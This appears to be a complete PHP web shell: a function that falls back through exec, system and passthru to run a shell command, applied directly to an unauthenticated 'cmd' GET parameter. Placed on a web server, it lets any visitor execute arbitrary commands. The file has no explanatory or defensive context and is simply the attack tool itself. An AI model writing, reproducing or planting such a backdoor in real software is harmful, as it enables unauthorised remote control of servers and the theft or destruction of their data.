<?php
function myshellexec($cmd)
{
	$result = '';
	if (is_callable('exec') and !in_array('exec',$disablefunc)) {
		exec($cmd , $result);
	}
	elseif (is_callable("system") and !in_array("system",$disablefunc)) {
		$v = @ob_get_contents(); 
		@ob_clean(); 
		system($cmd); 
		$result = @ob_get_contents(); 
		@ob_clean(); 
		echo $v;
	}
	elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {
		$v = @ob_get_contents(); 
		@ob_clean(); 
		passthru($cmd); 
		$result = @ob_get_contents(); 
		@ob_clean(); 
		echo $v;
		}

    return $result;
}

$cmdline = $_GET['cmd'];
$ret = myshellexec($cmdline); 
?>